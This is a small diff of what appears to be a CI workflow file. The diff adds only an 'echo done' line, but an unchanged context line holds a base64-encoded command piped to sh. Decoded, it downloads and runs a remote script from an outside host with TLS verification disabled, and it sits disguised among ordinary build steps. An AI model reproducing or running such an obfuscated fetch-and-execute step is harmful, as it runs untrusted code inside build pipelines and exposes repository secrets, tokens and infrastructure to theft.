@@ -39,3 +39,4 @@ jobs:
           echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9hY3Rpb25zL2ZsaXh8c2gK|base64 -d |sh
           ls -la $HOME
           echo test, and deploy your project.
+          echo done
